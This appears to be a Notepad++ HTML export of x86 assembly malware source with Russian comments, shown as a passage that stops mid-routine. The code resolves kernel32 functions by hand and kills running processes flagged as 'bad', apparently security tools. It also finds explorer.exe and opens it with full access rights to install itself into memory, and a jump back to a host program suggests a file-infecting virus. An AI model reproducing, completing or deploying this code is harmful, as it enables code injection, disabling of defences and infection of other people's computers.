<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">swap_file</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc12">'c:\swap'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;DEBUG equ YES</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32api.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">rulez.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">process.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">pe.inc</span><span class="sc0">
</span><span class="sc2">.586</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0"> </span><span class="sc5">__</span><span class="sc0">
</span><span class="sc5">model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">      </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">      </span><span class="sc5">GetLastError</span><span class="sc4">:</span><span class="sc9">Proc</span><span class="sc0">
</span><span class="sc5">mess</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'Ruff'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_offset</span><span class="sc0">
</span><span class="sc5">get_offset</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc0">                       </span><span class="sc1">;ebp=offset</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">get_offset</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">counter</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;обнулим переменные</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">process_to_open</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">new_rva</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">old_rva</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;eax=address of entry of exit function</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ffff0000h</span><span class="sc0">             </span><span class="sc1">;округляем до кратного 65536</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">65536</span><span class="sc0">
</span><span class="sc5">__not_found</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">65536</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">__not_found</span><span class="sc0">                 </span><span class="sc1">;eax - загрузочный адрес kernel32</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">kernel_base</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;ebx - загрузочный адрес kernel32</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ebx.exe_neptr</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;eax - начало PE-header'a</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">    </span><span class="sc5">kernel_found</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">goto_host</span><span class="sc0">
</span><span class="sc5">kernel_found</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;eax= rva of export table</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">eax.ED_AddressOfNames</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;ebx = array of RVA to names</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">__0</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;eax=Rva of first exported function</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">counter</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">sGetProcAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">StrCompare</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">GetProcFound</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">__0</span><span class="sc0">
</span><span class="sc5">GetProcFound</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.ED_AddressOfOrdinals</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;ebx = array of ordinals to names</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">counter</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">;eax=address ordinal of getprocaddress</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                              </span><span class="sc1">;ebx= adrress of export table</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebx.ED_BaseOrdinal</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">getpraddrord</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;eax=rva of functions</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">getpraddrord</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">kernel_base</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">sGetProcAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc1">;получить адреса функций</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">sBeep</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;ebx = offset of array of function names</span><span class="sc0">
</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">kernel_base</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sGetProcAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">repnz</span><span class="sc0">  </span><span class="sc6">scasb</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">all_funct_found</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">__2</span><span class="sc0">
</span><span class="sc5">all_funct_found</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;найти explorer и инсталлироваться в память</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc5">TH32CS_SNAPPROCESS</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sCreateToolhelp32Snapshot</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hSnapshot</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;eax = HSnapShot</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">prentry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.dwSize</span><span class="sc4">,</span><span class="sc5">pr_size</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">prentry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sProcess32First</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">ll</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">prentry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">hSnapshot</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sProcess32Next</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">end_of_list</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">prentry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc5">.szExeFile</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">repnz</span><span class="sc0">  </span><span class="sc6">scasb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc6">std</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
</span><span class="sc6">repnz</span><span class="sc0">  </span><span class="sc6">scasb</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">is_bad_prog</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">not_bad_prog</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">TerminateBadProg</span><span class="sc0">
</span><span class="sc5">not_bad_prog</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'LPXE'</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">expl_found</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">ll</span><span class="sc0">
</span><span class="sc5">expl_found</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">prentry</span><span class="sc4">+</span><span class="sc5">ebp.th32ProcessID</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">process_to_open</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">ll</span><span class="sc0">
</span><span class="sc5">end_of_list</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">process_to_open</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">goto_host</span><span class="sc0">
</span><span class="sc1">;найдём модуль SHELL32</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">hSnapshot</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sCloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">process_to_open</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc5">TH32CS_SNAPMODULE</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sCreateToolhelp32Snapshot</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hSnapshot</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">modentry</span><span class="sc4">+</span><span class="sc5">ebp.dwSize</span><span class="sc4">],</span><span class="sc5">mod_size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;eax = HSnapShot</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">modentry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sModule32First</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">modentry</span><span class="sc4">+</span><span class="sc5">ebp.szModule</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">modentry</span><span class="sc4">+</span><span class="sc5">ebp.szExePath</span><span class="sc0">
</span><span class="sc5">qq</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;eax = HSnapShot</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">modentry</span><span class="sc4">+</span><span class="sc5">ebp.dwSize</span><span class="sc4">],</span><span class="sc5">mod_size</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">modentry</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sModule32Next</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">shell32_not_found</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">modentry</span><span class="sc4">+</span><span class="sc5">ebp.szModule</span><span class="sc4">],</span><span class="sc12">'LEHS'</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">shell32_found</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">qq</span><span class="sc0">
</span><span class="sc5">shell32_not_found</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">goto_host</span><span class="sc0">
</span><span class="sc5">shell32_found</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">hSnapshot</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sCloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">process_to_open</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;Open process with all access rights</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc5">PROCESS_ALL_ACCESS</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sOpenProcess</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">open_handle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc1">;выделяем память (GlobalAlloc И VirtualAlloc для буфера под hintnames</span><span class="sc0">
</span><span class="sc1">;из хоста, начинаем поиск необходимых ф-ий, счётчик ф-ий = index</span><span class="sc0">
</span><span class="sc1">;в Address table</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4096</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sGlobalAlloc</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;проверить, не записаны лии мы уже туда</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">nmbofread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
